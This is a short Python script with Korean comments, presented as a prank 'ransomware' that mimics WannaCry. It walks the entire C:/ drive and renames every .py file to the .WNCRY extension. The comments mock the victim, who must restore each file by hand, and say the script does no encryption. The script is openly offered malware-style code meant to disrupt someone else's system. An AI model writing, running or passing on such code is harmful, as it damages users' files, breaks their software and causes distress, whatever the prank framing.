＃개발자: 차의서
#경고： 당신의 모든파일이 홪확장자만 변경되어 복구하려면 노가다 하셔야합니다　ㅋㅋㅋ
＃본 스크립트는 암호화기능이 포함되지 않습니다 오직 장난용으로 개발하였습니다
＃오류없이 하시려면＂("c:/")＂안에　경로를 입력하시오
import sys

import os.path
import glob
EXCEPT = ['.py']

for (path, dir, files) in os.walk("c:/"):
    for filename in files:
        ext = os.path.splitext(filename)[-1]
        if ext == '.py':
            print("%s/%s" % (path, filename))
            
            os.rename("%s\\%s" % (path, filename), "%s\\%s" % (path, os.path.splitext(filename)[0] + ".WNCRY"))

